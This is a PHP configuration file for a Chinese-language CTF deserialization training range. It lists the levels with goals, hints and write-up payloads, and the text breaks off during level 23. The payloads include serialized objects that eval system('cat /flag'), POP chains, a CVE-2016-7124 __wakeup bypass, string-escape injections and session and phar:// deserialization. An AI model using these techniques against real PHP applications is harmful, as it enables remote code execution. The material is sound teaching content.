<?php
/*
PHPSerialize-labs 关卡配置中心
© ProbiusOfficial(@hello-ctf.com) · github.com/ProbiusOfficial/PHPSerialize-labs
站点与关卡页均由本文件数据驱动;新增关卡 = 建目录 + 在此加一条配置。
*/

return [

'site' => [
    'title' => '从 0 开始的 PHP 反序列化引导靶场',
    'total' => 24,
],

/* 章节:主页分组与关卡导航顺序 */
'chapters' => [
    ['第一章 · 面向对象基础', [1, 2, 3]],
    ['第二章 · 序列化入门', [4, 5, 6]],
    ['第三章 · 反序列化与魔术方法', [7, 8, 9, 10, 11, 12, 13, 14]],
    ['第四章 · POP 链与引用', [15, 16, 21]],
    ['第五章 · 字符串逃逸', [17, 18, 19, 20]],
    ['第六章 · 真实攻击面', [22, 23, 24]],
],

'levels' => [

1 => [
    'title' => '类的实例化', 'mode' => 'guided', 'diff' => 1,
    'tags' => ['面向对象', '入门'],
    'goal' => '页面里有一个 FLAG 类,想办法创建它的实例,让构造函数把 flag 打印出来。',
    'know' => '在 PHP 中,我们用 <code>new 类名()</code> 创建对象;创建时会自动触发构造函数 <code>__construct()</code>。本关的构造函数会直接 echo flag——所以"看见 flag"只需要一次实例化。',
    'params' => [['method' => 'POST', 'name' => 'code', 'desc' => '要在页面上下文中执行的 PHP 代码']],
    'sources' => [['index.php(展示版)', 'Level1/source']],
    'key_lines' => [
        ['from' => 8, 'to' => 12, 'label' => 'FLAG 类:构造函数输出 flag'],
        ['from' => 18, 'to' => 19, 'label' => '提交的 code 会被 eval 执行'],
    ],
    'hints' => [
        '提交的 code 会被 <code>eval()</code> 执行,等价于你在页面的代码环境里写 PHP。',
        '创建对象:<code>new FLAG();</code> —— 别忘了结尾的 <code>;</code>',
    ],
    'wp' => [
        'idea' => 'code 参数会被 eval 执行,直接实例化 FLAG 类触发构造函数输出 flag。',
        'exp' => "code=new FLAG();",
    ],
],

2 => [
    'title' => '对象中值的传递', 'mode' => 'guided', 'diff' => 1,
    'tags' => ['面向对象', '属性操作'],
    'goal' => '把 <code>$flag_string</code> 的值赋给 <code>$target->free_flag</code>,让页面把它打印出来。',
    'know' => '访问/修改对象属性用 <code>-&gt;</code>:<code>$对象-&gt;属性 = 值;</code>。只有 public 属性能在类外直接访问,protected / private 不行——那是第 3 关的事。',
    'params' => [['method' => 'POST', 'name' => 'code', 'desc' => '要在页面上下文中执行的 PHP 代码']],
    'sources' => [['index.php(展示版)', 'Level2/source']],
    'key_lines' => [
        ['from' => 10, 'to' => 16, 'label' => 'FLAG 类:free_flag 是 public,可从外部赋值'],
        ['from' => 19, 'to' => 21, 'label' => 'eval 之后页面会输出 free_flag'],
    ],
    'hints' => [
        '目标:让 <code>$target->free_flag</code> 等于 <code>$flag_string</code>。',
        '赋值语句:<code>$target->free_flag=$flag_string;</code>',
    ],
    'wp' => [
        'idea' => '对象属性赋值:把外部变量 $flag_string 传入 $target 的 public 属性,页面随后输出它。',
        'exp' => "code=\$target->free_flag=\$flag_string;",
    ],
],

3 => [
    'title' => '对象中值的权限', 'mode' => 'guided', 'diff' => 1,
    'tags' => ['面向对象', '访问控制'],
    'goal' => 'public / protected / private 三个属性各取其一,拼出完整 flag。',
    'know' => '<b>public</b> 任何地方可访问;<b>protected</b> 仅类自身/子类/父类可访问;<b>private</b> 仅定义它的类可访问。protected 与 private 可以通过类内方法(getter)间接读取。',
    'params' => [['method' => 'POST', 'name' => 'code', 'desc' => '要在页面上下文中执行的 PHP 代码']],
    'sources' => [['index.php(展示版)', 'Level3/source']],
    'key_lines' => [
        ['from' => 8, 'to' => 19, 'label' => '三种权限的属性与对应 getter'],
        ['from' => 21, 'to' => 26, 'label' => '子类只能继承到 protected,拿不到 private'],
    ],
    'hints' => [
        'public 直接 <code>-&gt;</code> 访问;protected/private 用类里现成的 getter 方法。',
        '方法调用:<code>$target-&gt;get_protected_flag()</code>,字符串拼接用 <code>.</code>。',
        'code=<code>echo $target->public_flag.$target->get_protected_flag().$target->get_private_flag();</code>',
    ],
    'wp' => [
        'idea' => 'public 直接读,protected/private 通过类内 getter 读出三段拼合。',
        'exp' => "code=echo \$target->public_flag.\$target->get_protected_flag().\$target->get_private_flag();",
    ],
],

4 => [
    'title' => '序列化初体验', 'mode' => 'guided', 'diff' => 1,
    'tags' => ['序列化'],
    'goal' => '对象属性全是 private,直接访问拿不到——试试 <code>serialize()</code>,它会把属性完整吐出来。',
    'know' => 'serialize() 把对象转成字符串,不会标记函数,但会完整输出属性名与值(包括 private)。序列化串格式:<code>O:类名长度:"类名":属性数:{...}</code>。',
    'params' => [['method' => 'POST', 'name' => 'code', 'desc' => '要在页面上下文中执行的 PHP 代码']],
    'sources' => [['index.php(展示版)', 'Level4/source']],
    'key_lines' => [
        ['from' => 8, 'to' => 19, 'label' => 'FLAG 里嵌着 FLAG3,属性全是 private'],
        ['from' => 21, 'to' => 21, 'label' => '已实例化好的对象在 $flag_is_here'],
    ],
    'hints' => [
        '序列化已创建的对象:<code>echo serialize($flag_is_here);</code>',
        '输出里 private 属性名会带 <code>\\0类名\\0</code> 前缀(显示为空格),把值挑出来按顺序拼接即可。',
    ],
    'wp' => [
        'idea' => 'serialize 会完整输出 private 属性,从序列化串中读出各段值拼接。',
        'exp' => "code=echo serialize(\$flag_is_here);",
    ],
],

5 => [
    'title' => '序列化的普通值规则', 'mode' => 'guided', 'diff' => 2,
    'tags' => ['序列化', '格式'],
    'goal' => '按校验条件,用 <code>serialize()</code> 手工构造 6 种类型(对象/数组/字符串/整数/布尔/NULL)的序列化串分别提交。',
    'know' => '各类型格式:<code>s:长度:"...";</code>、<code>i:数字;</code>、<code>b:0/1;</code>、<code>N;</code>(NULL)、<code>a:个数:{键;值;}</code>、<code>O:...}</code>(对象)。反序列化≈按串"建变量"。',
    'params' => [
        ['method' => 'POST', 'name' => 'o', 'desc' => 'serialize(对象),要求 a_value == "FLAG"'],
        ['method' => 'POST', 'name' => 's', 'desc' => 'serialize("IWANT")'],
        ['method' => 'POST', 'name' => 'a', 'desc' => "serialize(['a'=>'Plz','b'=>'Give_M3'])"],
        ['method' => 'POST', 'name' => 'i', 'desc' => 'serialize(1)'],
        ['method' => 'POST', 'name' => 'b', 'desc' => 'serialize(true)'],
        ['method' => 'POST', 'name' => 'n', 'desc' => 'serialize(NULL)'],
    ],
    'sources' => [['题面 demo', 'Level5/demo'], ['index.php(展示版)', 'Level5/source']],
    'key_lines' => [
        ['from' => 15, 'to' => 20, 'label' => '每种类型 serialize 后长什么样'],
        ['from' => 36, 'to' => 44, 'label' => '六个参数都要满足对应条件'],
    ],
    'hints' => [
        '用页面右上角的「⌨ 运行器」直接写类生成对象串,不用装 PHP。',
        '布尔:<code>b:1;</code>;NULL:<code>N;</code>;整数:<code>i:1;</code>;字符串:<code>s:5:"IWANT";</code>',
        "数组:<code>a:2:{s:1:\"a\";s:3:\"Plz\";s:1:\"b\";s:7:\"Give_M3\";}</code>;对象:运行器写 class a_class{public \$a_value=\"FLAG\";}",
    ],
    'wp' => [
        'idea' => '按六种类型的序列化格式逐个构造提交。',
        'exp' => "o=O:7:\"a_class\":1:{s:7:\"a_value\";s:4:\"FLAG\";}\n&s=s:5:\"IWANT\";\n&a=a:2:{s:1:\"a\";s:3:\"Plz\";s:1:\"b\";s:7:\"Give_M3\";}\n&i=i:1;&b=b:1;&n=N;",
    ],
],

6 => [
    'title' => '序列化的权限修饰规则', 'mode' => 'guided', 'diff' => 2,
    'tags' => ['序列化', '%00'],
    'goal' => '分别让 protectedKEY 与 privateKEY 对象的属性值等于各自的名字,注意序列化串里的不可见字符。',
    'know' => '权限修饰会写进序列化串:protected → <code>%00*%00属性名</code>,private → <code>%00类名%00属性名</code>(%00 是空字节)。构造含不可见字符的 payload 必须走 URL 编码。',
    'params' => [
        ['method' => 'POST', 'name' => 'protected_key', 'desc' => 'protected 属性值为 "protected_key" 的序列化串(URL编码)'],
        ['method' => 'POST', 'name' => 'private_key', 'desc' => 'private 属性值为 "private_key" 的序列化串(URL编码)'],
    ],
    'sources' => [['index.php(展示版)', 'Level6/source']],
    'key_lines' => [
        ['from' => 8, 'to' => 19, 'label' => 'protected / private 各一个属性'],
        ['from' => 26, 'to' => 28, 'label' => '两个对象都要通过 get_key 校验'],
    ],
    'hints' => [
        'protected 的串:<code>O:12:"protectedKEY":1:{s:16:"%00*%00protected_key";s:13:"protected_key";}</code>',
        'private 的串:<code>O:10:"privateKEY":1:{s:23:"%00privateKEY%00private_key";s:11:"private_key";}</code>',
        '用「⌨ 运行器」生成后打开 URL 编码开关,整串复制提交。',
    ],
    'wp' => [
        'idea' => '按 %00 规则手写两个序列化串,URL 编码后提交。',
        'exp' => "protected_key=O%3A12%3A%22protectedKEY%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00protected_key%22%3Bs%3A13%3A%22protected_key%22%3B%7D\n&private_key=O%3A10%3A%22privateKEY%22%3A1%3A%7Bs%3A23%3A%22%00privateKEY%00private_key%22%3Bs%3A11%3A%22private_key%22%3B%7D",
    ],
],

7 => [
    'title' => '实例化和反序列化', 'mode' => 'guided', 'diff' => 2,
    'tags' => ['反序列化', '漏洞原理'],
    'goal' => '页面演示了「实例化 vs 反序列化」创建对象的差别。通过 <code>POST o</code> 提交你构造的序列化串,让 <code>backdoor()</code> 执行你指定的命令读出 flag。',
    'know' => '实例化创建对象时属性值来自类定义;而 <code>unserialize($str)</code> 是按字符串"还原"对象——<b>字符串可控,对象的属性就可控</b>。这就是反序列化漏洞的根源。',
    'params' => [['method' => 'POST', 'name' => 'o', 'desc' => '构造的 FLAG 对象序列化串(URL编码)']],
    'sources' => [['演示 demo', 'Level7/demo'], ['Now Your Turn', 'Level7/source']],
    'key_lines' => [
        ['from' => 11, 'to' => 17, 'label' => 'FLAG 类:backdoor() 会 eval 掉 flag_command'],
        ['from' => 19, 'to' => 19, 'label' => '演示串与默认命令不同——这就是"还原可控"'],
        ['from' => 23, 'to' => 26, 'label' => '入口:POST o → unserialize → backdoor()'],
    ],
    'hints' => [
        '提交的 <code>o</code> 被还原成对象后立刻调用 <code>-&gt;backdoor()</code>——你要控制的就是这个对象的属性。',
        '<code>flag_command</code> 是 public 属性,反序列化时完全由你的字符串决定;让它变成读 flag 的命令。',
        '用「⌨ 运行器」:class FLAG{public $flag_command = "system(\'cat /flag\');";} → 生成 → URL 编码提交。',
    ],
    'wp' => [
        'idea' => '反序列化 = 按字符串还原对象,flag_command 完全可控 → eval 任意命令。',
        'exp' => "class FLAG{\n    public \$flag_command = \"system('cat /flag');\";\n}\necho urlencode(serialize(new FLAG()));",
    ],
],

8 => [
    'title' => '构造函数和析构函数以及GC机制', 'mode' => 'guided', 'diff' => 2,
    'tags' => ['魔术方法', 'GC'],
    'goal' => '让页面输出 <code>flag &gt; 5</code> 的判定通过:观察演示中构造/析构的触发时机,想办法让 <code>$flag</code> 累加到 5 以上。',
    'know' => '<code>__construct</code> 只在 new 时触发,<b>反序列化不会触发构造函数</b>;<code>__destruct</code> 在对象被回收时触发(手动 unset / 无引用自动回收 / 脚本结束)。序列化不触发任何魔术方法。',
    'params' => [['method' => 'POST', 'name' => 'code', 'desc' => '要在页面上下文中执行的 PHP 代码']],
    'sources' => [['演示 demo', 'Level8/demo'], ['index.php(展示版)', 'Level8/source']],
    'key_lines' => [
        ['from' => 45, 'to' => 52, 'label' => 'RELFLAG:construct 让 flag 归 1,destruct 让 flag +1'],
        ['from' => 62, 'to' => 66, 'label' => 'flag > 5 时输出 flag'],
    ],
    'hints' => [
        '<code>new RELFLAG()</code> 不接进变量会立刻被 GC 回收——析构立即触发。',
        '<code>unserialize(serialize($x))</code>:反序列化触发构造(归 1),产生的临时对象无引用,随即析构(+1)。',
        '把"序列化/反序列化"套多层,一次性制造多次构造+析构,让计数突破 5。',
    ],
    'wp' => [
        'idea' => '嵌套 unserialize(serialize(...)) 制造连续的构造归位与析构累加,临时对象无引用立即回收,最终 flag 计数 > 5。',
        'exp' => "code=unserialize(serialize(unserialize(serialize(unserialize(serialize(unserialize(serialize(new RELFLAG()))))))));",
    ],
],

9 => [
    'title' => '构造函数的后门', 'mode' => 'guided', 'diff' => 2,
    'tags' => ['析构函数', 'RCE'],
    'goal' => '似曾相识:FLAG 的析构函数会 eval 属性——还原一个命令执行的对象,dynamic 容器中 flag 在 <code>/flag</code>。',
    'know' => '与第 7 关同理,只是触发点从显式方法换成了析构函数 <code>__destruct()</code>:反序列化创建的对象在脚本结束时被回收,自动触发。',
    'params' => [['method' => 'POST', 'name' => 'o', 'desc' => '构造的 FLAG 对象序列化串(URL编码)']],
    'sources' => [['index.php(展示版)', 'Level9/source']],
    'key_lines' => [
        ['from' => 10, 'to' => 15, 'label' => '析构函数 eval flag_command'],
        ['from' => 17, 'to' => 19, 'label' => '提交 o 即反序列化'],
    ],
    'hints' => [
        '结构和第 7 关完全一致,只是 eval 由 <code>__destruct</code> 触发,提交后无需再调用方法。',
        '本地没有 /flag 时命令输出为空是正常的——换成 <code>system(\'ls\');</code> 先看环境。',
    ],
    'wp' => [
        'idea' => '还原 FLAG 对象,析构时 eval 执行 cat /flag。',
        'exp' => "class FLAG {\n    var \$flag_command = \"system('cat /flag');\";\n}\necho \"o=\".urlencode(serialize(new FLAG()));",
    ],
],

10 => [
    'title' => '__wakeup()', 'mode' => 'guided', 'diff' => 1,
    'tags' => ['魔术方法'],
    'goal' => '<code>__wakeup()</code> 在反序列化后立即触发并输出 flag——构造任意一个 FLAG 对象提交即可。',
    'know' => 'unserialize() 会检查类是否有 <code>__wakeup()</code>,有则先调用(常用于重新建立数据库连接等初始化)。这是你遇到的第一个真正意义上的魔术方法。',
    'params' => [['method' => 'POST', 'name' => 'o', 'desc' => 'FLAG 对象序列化串']],
    'sources' => [['关卡源码', 'Level10/index.php']],
    'key_lines' => [
        ['from' => 14, 'to' => 18, 'label' => '__wakeup:反序列化即触发,输出 flag'],
    ],
    'hints' => [
        'FLAG 类没有任何属性,序列化串属性数为 0:<code>O:4:"FLAG":0:{}</code>',
    ],
    'wp' => [
        'idea' => '空对象即可触发 __wakeup。',
        'exp' => "o=O:4:\"FLAG\":0:{}",
    ],
],

11 => [
    'title' => '__wakeup() · CVE-2016-7124', 'mode' => 'challenge', 'diff' => 2,
    'tags' => ['CVE', 'Bypass'],
    'goal' => '本关的 __wakeup 会把 flag 置空。提示:页面底部的 phpinfo 能告诉你环境版本;试试"属性个数"。',
    'know' => '',
    'params' => [['method' => 'POST', 'name' => 'o', 'desc' => 'FLAG 对象序列化串(改一改?)']],
    'sources' => [['关卡源码', 'Level11/index.php']],
    'key_lines' => [],
    'hints' => [
        'CVE-2016-7124(PHP5 < 5.6.25 / PHP7 < 7.0.10):序列化串中属性个数大于真实属性个数时,跳过 __wakeup。FLAG 只有 1 个属性——把 1 改成 2 试试。',
    ],
    'wp' => [
        'idea' => '把属性个数从 1 改成 2,触发 CVE-2016-7124 跳过 __wakeup,flag 不被置空。',
        'exp' => "O:4:\"FLAG\":1:{s:4:\"flag\";s:8:\"FAKEFLAG\";}\n→ 把 1 改成 2:\no=O:4:\"FLAG\":2:{s:4:\"flag\";s:8:\"FAKEFLAG\";}",
    ],
],

12 => [
    'title' => '__sleep()', 'mode' => 'guided', 'diff' => 2,
    'tags' => ['魔术方法'],
    'goal' => 'flag 被拆成 12 个属性。利用 <code>chance</code> 参数控制 __sleep 的返回数组,把 12 段都收集齐拼成 flag。',
    'know' => 'serialize() 前会先调用 <code>__sleep()</code>,其返回数组决定哪些属性被序列化;返回父类私有属性需 <code>\\0类名\\0属性名</code> 格式;不返回内容则序列化为 NULL。',
    'params' => [
        ['method' => 'GET', 'name' => 'chance', 'desc' => '指定 __sleep 返回的第三个属性名'],
    ],
    'sources' => [['index.php(展示版)', 'Level12/source']],
    'key_lines' => [
        ['from' => 36, 'to' => 45, 'label' => '__sleep 每次随机返回两个属性 + chance 指定的属性'],
    ],
    'hints' => [
        'flag = <code>$h+$e+$l+$I+$o+$c+$t+$f+$f+$l+$a+$g</code>(源码注释里有顺序)。',
        '每次请求 chance 指定一个字母,其余两个随机——多请求几次,把 12 段收集齐按顺序拼接。',
        '注意属性名是区分大小写的:<code>l</code> 和 <code>I</code> 是两个不同属性。',
    ],
    'wp' => [
        'idea' => '反复请求,用 chance 逐个指定属性,收集 12 段值按 h,e,l,I,o,c,t,f,f,l,a,g 顺序拼接。',
        'exp' => "依次请求:\nLevel12/index.php?chance=h / e / l / I / o / c / t / f / a / g\n(某些字母出现两次,收集两次)\n按顺序拼接 serialize 输出中的对应值。",
    ],
],

13 => [
    'title' => '__toString()', 'mode' => 'guided', 'diff' => 1,
    'tags' => ['魔术方法'],
    'goal' => '页面已实例化 <code>$obj</code>,把它"当成字符串"用,flag 就出来了。',
    'know' => '对象被当成字符串操作(如 <code>echo $obj</code>、拼接)时触发 <code>__toString()</code>。',
    'params' => [['method' => 'POST', 'name' => 'o', 'desc' => '要在页面上下文中执行的 PHP 代码']],
    'sources' => [['关卡源码', 'Level13/index.php']],
    'key_lines' => [
        ['from' => 11, 'to' => 17, 'label' => '__toString:被当字符串时输出 flag'],
        ['from' => 21, 'to' => 22, 'label' => 'o 会被 eval,且 $obj 已就位'],
    ],
    'hints' => [
        '一行代码:<code>echo $obj;</code>',
    ],
    'wp' => [
        'idea' => 'echo $obj 触发 __toString。',
        'exp' => "o=echo \$obj;",
    ],
],

14 => [
    'title' => '__invoke()', 'mode' => 'guided', 'diff' => 1,
    'tags' => ['魔术方法'],
    'goal' => '把对象"当函数调用"并传入 <code>get_flag</code>。',
    'know' => '以调用函数的方式调用对象(如 <code>$obj()</code>)时触发 <code>__invoke()</code>,参数照常传递。',
    'params' => [['method' => 'POST', 'name' => 'o', 'desc' => '要在页面上下文中执行的 PHP 代码']],
    'sources' => [['关卡源码', 'Level14/index.php']],
    'key_lines' => [
        ['from' => 11, 'to' => 17, 'label' => '__invoke:参数为 get_flag 时输出 flag'],
    ],
    'hints' => [
        '一行代码:<code>$obj(\'get_flag\');</code>',
    ],
    'wp' => [
        'idea' => '$obj("get_flag") 触发 __invoke。',
        'exp' => "o=\$obj('get_flag');",
    ],
],

15 => [
    'title' => 'POP 链前置', 'mode' => 'challenge', 'diff' => 2,
    'tags' => ['POP 链'],
    'goal' => '从终点 <code>destnation::action()</code> 的 eval 倒着找,把几个类"套娃"成一个对象图提交。',
    'know' => '',
    'params' => [['method' => 'POST', 'name' => 'o', 'desc' => '构造的对象序列化串(URL编码)']],
    'sources' => [['关卡源码', 'Level15/index.php']],
    'key_lines' => [],
    'hints' => [
        '终点:<code>action()</code> 执行 <code>$this->cmd->a->b->c</code>——cmd 得是一个 a→b→c 逐层可达的对象链,最里层 c 是命令字符串。',
        '起点:<code>D::__wakeUp()</code> 调用 <code>$this->d->action()</code>,所以最外层是 D,d 为 destnation。',
        '本地写这几个类,逐层 new 并赋值,最后 serialize 整个 D 对象。',
    ],
    'wp' => [
        'idea' => 'D(wakeup) → destnation(action) → A→B→C 三层属性链,末端 c 为命令。',
        'exp' => "class A { public \$a; }\nclass B { public \$b; }\nclass C { public \$c; }\nclass destnation { var \$cmd; }\nclass D { public \$d; }\n\n\$c = new C(); \$c->c = \"system('cat /flag');\";\n\$b = new B(); \$b->b = \$c;\n\$a = new A(); \$a->a = \$b;\n\$des = new destnation(); \$des->cmd = \$a;\n\$d = new D(); \$d->d = \$des;\necho \"o=\".urlencode(serialize(\$d));",
    ],
],

16 => [
    'title' => 'POP 链构造', 'mode' => 'challenge', 'diff' => 3,
    'tags' => ['POP 链', '魔术方法组合'],
    'goal' => '三个魔术方法串成一条链,让 <code>include</code> 读出 flag.php。',
    'know' => '',
    'params' => [['method' => 'POST', 'name' => 'o', 'desc' => '构造的对象序列化串(URL编码)']],
    'sources' => [['关卡源码', 'Level16/index.php']],
    'key_lines' => [],
    'hints' => [
        '从终点倒着找:<code>include $this->a</code> 在 A::__invoke;谁能触发 invoke?B::__toString 里的 <code>($this->b)()</code>。',
        '入口:INIT::__wakeup 里的 <code>echo $this->name</code> 触发 toString。',
        '链:INIT->name = B,B->b = A,A->a = "flag.php"。',
    ],
    'wp' => [
        'idea' => 'INIT(wakeup/echo) → B(toString/函数调用) → A(include)。',
        'exp' => "class A { public \$a = 'flag.php'; }\nclass B { public \$b; }\nclass INIT { public \$name; }\n\n\$b = new B(); \$b->b = new A();\n\$i = new INIT(); \$i->name = \$b;\necho \"o=\".urlencode(serialize(\$i));",
    ],
],

17 => [
    'title' => '字符串逃逸基础·无中生有', 'mode' => 'guided', 'diff' => 3,
    'tags' => ['字符串逃逸'],
    'goal' => '给空类 A"无中生有"一个属性:提交一个 A 类的序列化串,让 <code>helloctfcmd == "get_flag"</code>。',
    'know' => '反序列化创建的对象由类定义与序列化字符串共同决定,且字符串优先——用一个带属性的 A 对象串去还原空类 A,属性会直接"长"出来。',
    'params' => [['method' => 'POST', 'name' => 'o', 'desc' => '构造的 A 类序列化串']],
    'sources' => [['关卡源码', 'Level17/index.php']],
    'key_lines' => [
        ['from' => 12, 'to' => 13, 'label' => '空类 A'],
        ['from' => 28, 'to' => 32, 'label' => '校验:A 的 helloctfcmd 属性'],
    ],
    'hints' => [
        '本地(或运行器)写 <code>class A{public $helloctfcmd="get_flag";}</code> 再 serialize。',
    ],
    'wp' => [
        'idea' => '序列化字符串优先于类定义,还原后属性"无中生有"。',
        'exp' => "o=O:1:\"A\":1:{s:11:\"helloctfcmd\";s:8:\"get_flag\";}",
    ],
],

18 => [
    'title' => '字符串逃逸基础·尾部判定', 'mode' => 'guided', 'diff' => 3,
    'tags' => ['字符串逃逸'],
    'goal' => '页面提供了一个 str_replace 替换接口:让 <code>key</code> 从 <code>GET_FLAG";}FAKE_FLAG</code> 变成 <code>GET_FLAG</code>,并让对象变成 FLAG 类。',
    'know' => '反序列化以 <code>;}</code> 判定结尾:当属性数量、名称长度、内容长度都一致时,多余内容被丢弃——"缩窄"长度值即可截断尾部。',
    'params' => [
        ['method' => 'GET', 'name' => 'target', 'desc' => '数组,要被替换的内容'],
        ['method' => 'GET', 'name' => 'change', 'desc' => '数组,替换成的内容'],
    ],
    'sources' => [['关卡源码', 'Level18/index.php']],
    'key_lines' => [
        ['from' => 12, 'to' => 16, 'label' => 'Demo 对象:key 值内嵌了假结尾'],
        ['from' => 24, 'to' => 24, 'label' => '替换发生在 serialize 之后'],
    ],
    'hints' => [
        'key 的值 <code>GET_FLAG";}FAKE_FLAG</code> 长度 20——把 20 改成 8,解析到 <code>GET_FLAG</code> 就会判定结束。',
        '类名也要从 Demo 变成 FLAG(校验 instanceof FLAG)。',
    ],
    'wp' => [
        'idea' => '两次替换:Demo→FLAG、20→8,利用 ;} 尾部判定截断。',
        'exp' => "Level18/index.php?target[]=Demo&target[]=20&change[]=FLAG&change[]=8",
    ],
],

19 => [
    'title' => '字符串逃逸·减少', 'mode' => 'guided', 'diff' => 3,
    'tags' => ['字符串逃逸', '过滤'],
    'goal' => '过滤会把 <code>getflag</code> 从序列化串中删除。利用"变短"让解析器读串,最终让还原出的 <code>$helloctf_b === "get_flag"</code>。',
    'know' => '过滤使串变短,但声明的长度不变——解析器会"多读"一段内容,把后面的结构吞进值里,腾出的位置由你注入的结构补上。',
    'params' => [
        ['method' => 'GET', 'name' => 'a', 'desc' => 'tj_a 的值(放过滤字符)'],
        ['method' => 'GET', 'name' => 'b', 'desc' => 'helloctf_b 的值(放逃逸结构)'],
    ],
    'sources' => [['关卡源码', 'Level19/index.php']],
    'key_lines' => [
        ['from' => 15, 'to' => 17, 'label' => '过滤:getflag 从串中删除'],
        ['from' => 33, 'to' => 35, 'label' => '校验:helloctf_b 严格等于 get_flag'],
    ],
    'hints' => [
        '每个 getflag(7 字符)被删掉后,解析器就多读 7 个字符——多读的部分会吞掉后面的结构。',
        '注入结构放在 <b>b</b> 里,a 里的 getflag 决定吞多远:边界要正好落在注入结构的 <code>";</code> 前。',
        '已验证配方:a=<code>getflag×6</code>,b=<code>FFFFFFFFFFFFFFFF</code> + <code>";s:10:"helloctf_b";s:8:"get_flag";}</code>(16 个 F 是补位,把边界顶到注入结构前)。',
    ],
    'wp' => [
        'idea' => 'a 中 getflag 被删导致声明长度"读多",吞掉真实 b 的结构,边界对齐 b 中注入的伪造属性。',
        'exp' => "a=getflaggetflaggetflaggetflaggetflaggetflag\n&b=FFFFFFFFFFFFFFFF\";s:10:\"helloctf_b\";s:8:\"get_flag\";}",
    ],
],

20 => [
    'title' => '字符串逃逸·增多', 'mode' => 'guided', 'diff' => 3,
    'tags' => ['字符串逃逸', '过滤'],
    'goal' => '过滤会把 <code>x</code> 替换成更长的 <code>helloctf</code>。利用"变长"把后续内容挤出去,让还原出的 <code>$helloctf_b === "get_flag"</code>。',
    'know' => '过滤使串变长,声明的长度却没变——值会被"截短"读出,剩下的内容溢出成新的结构。',
    'params' => [
        ['method' => 'GET', 'name' => 'a', 'desc' => 'tj_a 的值(不要含 x)'],
        ['method' => 'GET', 'name' => 'b', 'desc' => 'helloctf_b 的值(x 填充 + 逃逸结构)'],
    ],
    'sources' => [['关卡源码', 'Level20/index.php']],
    'key_lines' => [
        ['from' => 15, 'to' => 17, 'label' => '过滤:x 膨胀为 helloctf(1→8)'],
        ['from' => 33, 'to' => 35, 'label' => '校验:helloctf_b 严格等于 get_flag'],
    ],
    'hints' => [
        '每个 x 变成 8 字符的 helloctf(+7);声明的长度不变,读值就会在半路"断掉",后面的内容溢出成新结构。',
        '注入结构放在 <b>a</b> 里(第一个属性),溢出后正好顶替 helloctf_b 的位置;b 保持干净(不要含 x 和注入结构)。',
        '已验证配方:a=<code>xxxxxx</code> + <code>";s:10:"helloctf_b";s:8:"get_flag";}</code> + <code>JJJJJJ</code>,b=<code>BBB</code>。',
    ],
    'wp' => [
        'idea' => 'b 中 x 膨胀使实际内容超出声明长度,解析在声明长度处截断,溢出部分被当作下一个属性解析。',
        'exp' => "a=xxxxxx\";s:10:\"helloctf_b\";s:8:\"get_flag\";}JJJJJJ\n&b=BBB",
    ],
],

21 => [
    'title' => '引用的利用', 'mode' => 'guided', 'diff' => 2,
    'tags' => ['引用', 'R:'],
    'goal' => '<code>__wakeup</code> 会把 <code>$tj_token</code> 刷新成随机值——让它和 <code>$helloctf_token</code> 依然相等。',
    'know' => '序列化串中的 <code>R:行号</code> 表示引用:两个属性指向同一份值,一改俱改。本地构造 <code>$o->helloctf_token = &$o->tj_token;</code> 再 serialize 就会出现 R。',
    'params' => [['method' => 'POST', 'name' => 'o', 'desc' => 'FLAG 对象序列化串(URL编码)']],
    'sources' => [['关卡源码', 'Level21/index.php']],
    'key_lines' => [
        ['from' => 14, 'to' => 16, 'label' => '__wakeup:token 被刷新为随机值'],
        ['from' => 18, 'to' => 26, 'label' => '严格相等校验'],
    ],
    'hints' => [
        '本地:先给 tj_token 随便赋值,再 <code>$o->helloctf_token = &$o->tj_token;</code>(注意 & ),serialize 会出现 <code>R:2</code>。',
        '引用让两个属性共享存储:__wakeup 改了 tj_token,helloctf_token 跟着变,严格相等永远成立。',
    ],
    'wp' => [
        'idea' => '用序列化引用 R 把两个属性指向同一存储,wakeup 刷新后依然相等。',
        'exp' => "class FLAG {\n    public \$tj_token;\n    public \$helloctf_token;\n}\n\$o = new FLAG();\n\$o->tj_token = 1;\n\$o->helloctf_token = &\$o->tj_token;\necho urlencode(serialize(\$o));\n// O:4:\"FLAG\":2:{s:8:\"tj_token\";i:1;s:14:\"helloctf_token\";R:2;}",
    ],
],

22 => [
    'title' => 'session 反序列化', 'mode' => 'guided', 'diff' => 3,
    'tags' => ['session', '存储格式'],
    'goal' => '写入用 php_serialize,读取按 php 处理器(key|value)解析——利用格式差异注入一个 FLAG 对象,让 <code>$tj_name === "get_flag"</code>。',
    'know' => 'session 有多种序列化处理器:<b>php</b> 用 <code>key|serialize(value)</code> 格式,<b>php_serialize</b> 用 <code>serialize(整个数组)</code>。写入与读取处理器不一致时,value 里的 <code>|</code> 可以伪造出新的 key|value 对。',
    'params' => [['method' => 'GET', 'name' => 'a', 'desc' => '写入 session 的内容']],
    'sources' => [['关卡源码', 'Level22/index.php']],
    'key_lines' => [
        ['from' => 17, 'to' => 22, 'label' => '写入侧:php_serialize 处理器'],
        ['from' => 30, 'to' => 34, 'label' => '读取侧:以第一个 | 切分后直接 unserialize'],
    ],
    'hints' => [
        'payload 以 <code>|</code> 开头:让读取侧把 | 后面的内容当成某个 key 的序列化值。',
        'payload:<code>|O:4:"FLAG":1:{s:7:"tj_name";s:8:"get_flag";}</code>(URL 编码后提交 ?a=...)',
    ],
    'wp' => [
        'idea' => 'php_serialize 把整个 payload 存成一个字符串值;php 处理器按第一个 | 切分,| 后被当作序列化值反解出 FLAG 对象。',
        'exp' => "?a=%7CO%3A4%3A%22FLAG%22%3A1%3A%7Bs%3A7%3A%22tj_name%22%3Bs%3A8%3A%22get_flag%22%3B%7D",
    ],
],

23 => [
    'title' => 'phar 反序列化', 'mode' => 'guided', 'diff' => 3,
    'tags' => ['phar', '文件函数'],
    'goal' => '目录里有现成的 <code>helloctf.phar</code>(metadata 是 FLAG 对象)。找一个文件函数触碰它,让 metadata 被反序列化,执行 <code>cat /flag</code>。',
    'know' => 'phar 文件的 metadata 在被文件函数(<code>is_dir / file_exists / filesize...</code>)以 <code>phar://</code> 流访问时会被自动反序列化——无需 unserialize() 调用。',
    'params' => [['method' => 'GET', 'name' => 'file', 'desc' => '文件路径(支持流封装)']],
    'sources' => [['关卡源码', 'Level23/index.php'], ['构建辅助脚本', 'Level23/build_phar.php']],
    'key_lines' => [
        ['from' => 19, 'to' => 22, 'label' => 'is_dir 触碰 phar:// 流 → metadata 反序列化'],
    ],
    'hints' => [
        '提交 <code>?file=phar://helloctf.phar</code>(相对本目录)。',
